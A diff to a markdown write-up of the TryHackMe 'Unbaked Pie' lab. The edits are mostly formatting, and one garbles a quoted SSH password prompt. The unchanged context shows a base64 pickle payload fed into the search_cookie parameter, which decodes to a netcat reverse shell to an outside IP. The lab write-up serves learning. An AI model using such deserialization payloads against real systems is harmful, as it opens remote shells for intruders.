@@ -9,7 +9,7 @@ image:
 
 ## Description ⤵️
 
-This machine is <kbd>*Unbaked Pie*</kbd> , It is from TryHackMe Platform and categorized as Medium machine . This Machine has pickle vulnerability .
+This machine is *<kbd>Unbaked Pie</kbd>* , It is from TryHackMe Platform and categorized as Medium machine . This Machine has pickle vulnerability .
 
 ## Port Scan Results ⤵️
 
@@ -104,8 +104,8 @@ if __name__ == '__main__':
 Now I executed this payload and got an input that I used in `search_cookie=` parameter in /search request and send the request →
 
 ```python
-┌──(kali㉿kali)-[~/Downloads/Tryhackme/Unbaked_Pie]
-└─$ python3 exploit.py
+python3 exploit.py
+
 b'gASVaQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE5ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjgzLjE1NiA0NDQ0ID4vdG1wL2aUhZRSlC4='
 ```
 
@@ -294,7 +294,7 @@ ED25519 key fingerprint is SHA256:B6SoW4WBwsc2n9NynSce9+R0E44T4YkZVRxD5y5Muhc.
 This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '[127.0.0.1]:1234' (ED25519) to the list of known hosts.
-ramsey@127.0.0.1's password: 
+ramsey@127.0.0.1 is password: 
 Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
